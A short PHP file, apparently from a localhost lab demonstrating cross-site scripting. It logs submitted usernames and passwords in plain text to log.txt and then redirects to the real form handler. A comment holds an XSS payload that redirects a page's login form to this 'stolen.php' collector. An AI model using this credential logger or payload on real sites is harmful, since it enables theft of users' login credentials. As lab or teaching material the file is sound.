<?php

$un = $_POST['username'];
$pw = $_POST['password'];

$write_string = 'un:'.$un.'-pw:'.$pw;

$fp = fopen('log.txt', 'a');
fwrite($fp, $write_string);
fclose($fp);

header('Location: http://localhost:8888/xss-php/xss-form-action.php');

/**
 * Script for XSS
 */
// <script>window.onload=function() {document.forms[0].action = "http://localhost:8888/xss-php/stolen.php"};</script>